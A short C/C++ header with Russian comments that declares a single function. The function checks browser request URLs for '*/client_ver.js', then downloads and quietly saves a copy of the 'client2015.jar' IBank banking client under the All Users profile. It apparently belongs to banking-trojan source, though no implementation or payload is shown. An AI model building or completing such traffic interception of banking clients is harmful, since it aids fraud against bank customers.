
//---------------------------------------------------------------------------
//
//  Модуль сохраняет оригинальный файл client2015.jar
//
//---------------------------------------------------------------------------

#ifndef JavaClient2015SaverH
#define JavaClient2015SaverH
//---------------------------------------------------------------------------

//*****************************************************************
//  Функция проверяет запрос и, в случае обнаружения адреса с
//  маской
//  "*/client_ver.js", скачиваем фойл
//  "http://host_name/client2015.jar" и сохраняем его в файл
//  %AllUsersProfile%\Application Data\IBank\_client2015_orig.jar
//*****************************************************************
void CheckJavaClient2015File(const char *aURL);

//---------------------------------------------------------------------------
#endif
